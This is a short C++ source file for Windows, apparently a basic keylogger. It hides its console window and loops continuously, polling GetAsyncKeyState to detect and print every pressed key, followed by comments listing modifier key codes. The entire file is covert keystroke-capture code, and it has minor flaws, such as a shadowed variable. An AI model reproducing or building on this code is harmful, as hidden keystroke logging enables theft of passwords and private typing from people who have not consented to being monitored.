#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char key = 'q';

    while (1){
        Sleep(10);
        for (int key =8; key <=129; key++){
            if (GetAsyncKeyState(key) == -32767){
            printf("key %c pressed\n", key);
            } else if (GetAsyncKeyState(VK_LSHIFT)){
                printf("left Shift\n");
            }
        }

    }
    return 0;
}

// VK_LSHIFT    Left-shift key.
// VK_RSHIFT    Right-shift key.
// VK_LCONTROL  Left-control key.
// VK_RCONTROL  Right-control key.
// VK_LMENU Left-menu key.
// VK_RMENU Right-menu key.